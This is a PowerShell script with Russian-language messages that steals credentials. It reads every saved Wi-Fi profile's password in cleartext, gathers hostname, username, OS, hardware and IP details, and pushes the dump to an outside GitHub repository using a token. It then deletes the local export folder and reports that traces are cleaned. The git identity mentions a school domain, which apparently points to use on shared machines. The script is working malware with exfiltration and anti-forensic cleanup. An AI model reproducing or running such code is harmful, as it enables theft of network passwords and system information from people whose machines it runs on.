$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "Запусти от имени администратора!" -ForegroundColor Red
    exit 1
}

$RepoUrl = "https://github.com/DilanBlue/wifi.git"
$Token = $env:GH_TOKEN

if (-not $Token) {
    Write-Host "GH_TOKEN не передан!" -ForegroundColor Red
    exit 1
}

$exportDir = "C:\WiFiExport"
$hostname = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$filePath = Join-Path $exportDir "${hostname}_${timestamp}.txt"

New-Item -ItemType Directory -Force -Path $exportDir | Out-Null

$old = [Console]::OutputEncoding
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Wi-Fi
$profiles = (netsh wlan show profiles) | Select-String ':\s+(.+?)\s*$' | % { $_.Matches.Groups[1].Value.Trim() }

$results = @()
$found = 0

foreach ($p in $profiles) {
    if (-not $p) { continue }
    $info = netsh wlan show profile name="$p" key=clear
    $pass = "НЕ НАЙДЕН"
    $m = $info | Select-String "(Содержимое ключа|Key Content)[\s:]+(.+)"
    if ($m) {
        $pass = $m.Matches.Groups[2].Value.Trim()
        if ($pass.Length -gt 3) { $found++ }
    }
    $results += "SSID     : $p"
    $results += "Пароль   : $pass"
    $results += "----------------------------------------"
}

# Информация о ПК
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$disk = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}).Size / 1GB
$disk = [math]::Round($disk, 2)
$username = $env:USERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress

$header = @"
PC INFO + WiFi PASSWORDS
========================================
Hostname     : $hostname
Пользователь : $username
OS           : $os
CPU          : $cpu
RAM          : ${ram} GB
Disk C:      : ${disk} GB
IP           : $ip
Дата         : $(Get-Date)
WiFi сетей   : $($profiles.Count)
WiFi паролей : $found
========================================
"@

$header + ($results -join "`n") | Out-File -Encoding UTF8 -FilePath $filePath

Write-Host "Готово! $found паролей" -ForegroundColor Green

# Push на GitHub
$repoDir = Join-Path $exportDir "repo"
if (!(Test-Path $repoDir)) { git clone $RepoUrl $repoDir }

Copy-Item $filePath $repoDir -Force

Push-Location $repoDir
git config user.name "WiFi-Exporter"
git config user.email "exporter@school.local"
git add "*.txt"
git commit -m "Dump $hostname $timestamp" 2>$null
git push "https://$Token@github.com/DilanBlue/wifi.git" main 2>$null
Pop-Location

# Очистка
Remove-Item $exportDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Следы очищены" -ForegroundColor Gray
